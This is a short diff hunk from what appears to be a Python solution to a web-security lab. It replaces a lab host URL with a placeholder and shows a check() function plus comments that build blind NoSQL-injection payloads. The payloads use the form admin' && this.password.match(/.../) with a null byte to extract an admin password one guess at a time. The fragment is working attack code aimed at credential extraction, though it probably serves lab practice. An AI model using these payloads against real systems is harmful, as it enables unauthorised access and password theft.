@@ -8,7 +8,7 @@ import string
 # /?search=admin'%20%26%26%20this.password.match(/"+payload+"/)//
 # /?search=admin'%20%26%26%20this.passwordzz.match(/"+payload+"/)//
 
-URL="http://ptl-322363a0-15871535.libcurl.st"
+URL="http://xxxxxxx"
 
 def check(payload):
     url=URL+"/?search=admin'%20%26%26%20this.password.match(/"+payload+"/)%00"
